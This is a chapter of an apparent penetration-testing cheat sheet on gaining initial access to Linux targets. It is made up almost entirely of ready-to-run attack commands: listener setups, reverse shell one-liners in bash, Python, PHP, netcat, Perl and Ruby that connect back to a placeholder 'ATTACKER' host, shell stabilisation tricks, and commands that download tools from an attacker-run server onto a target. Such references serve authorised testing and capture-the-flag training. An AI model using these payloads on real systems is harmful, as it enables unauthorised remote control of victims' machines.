[◀ Prev: Web App Attacks](04-web-app-attacks.md) · [🏠 Index](README.md) · [Next: Linux PrivEsc ▶](06-linux-privesc.md)

---

# 05 · Initial Access — Gaining a Foothold

## 5.1 Reverse Shell One-Liners

### Listener Setup (Attacker Side)

```bash
# Standard netcat listener
nc -lnvp 4444
rlwrap nc -lnvp 4444    # Better shell (arrow keys, history)

# pwncat-cs — fully featured shell handler
pwncat-cs -lp 4444

# Multi/handler in Metasploit
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST tun0; set LPORT 4444; run -j'
```

### Reverse Shell Payloads (Victim Side)

```bash
# bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# python2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# php
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# netcat (with -e)
nc -e /bin/bash ATTACKER 4444

# netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER 4444 >/tmp/f

# perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# ruby
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## 5.2 Shell Stabilisation — Always Do This

```bash
# Method 1 — Python PTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Method 2 — Full TTY (best — gives tab completion, arrows, Ctrl+C)
# Step 1: On target — spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Step 2: Background with Ctrl+Z
# Step 3: On attacker
stty raw -echo; fg
# Step 4: Back in shell — reset and configure
reset
export TERM=xterm
export SHELL=/bin/bash
stty rows 50 columns 220

# Method 3 — socat (cleanest)
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444

# Method 4 — script command
script /dev/null -c bash
```

## 5.3 File Transfer to Target

```bash
# Set up HTTP server on attacker
python3 -m http.server 8000
python3 -m http.server 8000 --directory /path/to/files

# Download on target
wget http://ATTACKER:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://ATTACKER:8000/file -o /tmp/file

# Base64 transfer (when no wget/curl)
# Attacker: encode
base64 -w0 file.sh
# Target: decode
echo 'BASE64STRING' | base64 -d > /tmp/file.sh

# SCP (if SSH available)
scp file.sh user@$TARGET:/tmp/

# Netcat transfer
# Receiver:
nc -lnvp 9999 > received_file
# Sender:
nc TARGET 9999 < file_to_send
```

---

[◀ Prev: Web App Attacks](04-web-app-attacks.md) · [🏠 Index](README.md) · [Next: Linux PrivEsc ▶](06-linux-privesc.md)
